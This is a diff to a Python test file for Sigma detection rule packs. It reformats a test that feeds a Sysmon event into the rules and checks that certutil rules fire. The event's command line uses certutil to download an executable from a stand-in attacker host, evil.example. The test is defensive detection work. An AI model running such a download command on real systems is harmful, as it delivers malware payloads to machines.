@@ -1,4 +1,5 @@
 """Community rule packs (rules/community): manifests, both-engine validity, lazy endpoints, prefilter coverage."""
+
 from __future__ import annotations
 
 import json
@@ -139,8 +140,16 @@ def test_shipped_sigma_rules_fire_on_matching_events(store):
     assert len(certutil) >= 3
     w = EventWriter(store, 1)
     sysmon = "Microsoft-Windows-Sysmon/Operational"
-    w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\System32\certutil.exe", originalFileName="CertUtil.exe",
-              commandLine="certutil.exe -urlcache -split -f http://evil.example/a.exe C:\\Users\\Public\\a.exe", parentImage=r"C:\Windows\System32\cmd.exe"))
+    w.add(
+        _ev(
+            eventId=1,
+            channel=sysmon,
+            image=r"C:\Windows\System32\certutil.exe",
+            originalFileName="CertUtil.exe",
+            commandLine="certutil.exe -urlcache -split -f http://evil.example/a.exe C:\\Users\\Public\\a.exe",
+            parentImage=r"C:\Windows\System32\cmd.exe",
+        )
+    )
     w.add(_ev(eventId=1, channel=sysmon, image=r"C:\Windows\notepad.exe", commandLine="notepad.exe", parentImage=r"C:\Windows\explorer.exe"))
     w.flush()
     res = R.run_rules(store, certutil, {})
